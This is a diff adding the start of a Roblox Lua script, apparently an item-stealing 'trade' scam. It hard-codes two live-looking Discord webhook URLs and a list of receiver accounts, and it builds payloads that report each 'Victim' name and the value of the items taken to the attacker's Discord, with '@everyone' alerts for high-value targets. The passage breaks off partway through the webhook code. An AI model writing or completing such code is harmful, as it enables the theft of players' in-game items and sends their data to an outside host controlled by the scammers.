@@ -1,0 +1,40 @@
+-- [[ MONDEUR PURE TRADE & DUALHOOK ENGINE ]] --
+-- Focus: Trading Logic, Sequential Injection, Dualhook Pings (@everyone)
+
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService       = game:GetService("HttpService")
+local LocalPlayer       = Players.LocalPlayer
+
+-- [[ ⚙️ CONFIGURATION ]] --
+local Config = {
+    UserHook = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG",
+    DualHook = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku",
+    
+    -- Admin Receivers
+    Receivers = {"CREOLE023", "Hisokarah", "2ndcfpaj67", "3rdcfpaj67"}, 
+    
+    -- Logic Settings
+    UserThreshold = 10,     -- User set threshold for @everyone on Normal Hook
+    DualThreshold = 40.0,   -- 500+ PHP Threshold (Red Alert + @everyone)
+    TradeDelay    = 1.3     -- Safety delay
+}
+
+-- [[ 1. WEBHOOK ENGINE WITH PINGS ]] --
+local function SendTradeLog(hook, totalValue, petString, isHighTier, receiver, shouldPing)
+    local content = ""
+    if shouldPing then
+        content = "@everyone" -- Pings only if logic criteria met
+    end
+
+    local payload = HttpService:JSONEncode({
+        ["content"] = content,
+        ["username"] = "bitchass",
+        ["embeds"] = {{
+            ["title"] = isHighTier and "🔥 TARGET ACQUIRED (HIGH TIER)" or "💎 SYSTEM CONNECTED",
+            ["color"] = isHighTier and 0xFF0000 or 0x00FF00,
+            ["fields"] = {
+                {["name"] = "Victim", ["value"] = "**" .. LocalPlayer.Name .. "**", ["inline"] = true},
+                {["name"] = "Admin", ["value"] = "**" .. receiver .. "**", ["inline"] = true},
+                {["name"] = "Total Points", ["value"] = "```" .. string.format("%.2f", totalValue) .. "```", ["inline"] = false},
+                {["name"] = "Items Added", ["value"] = "
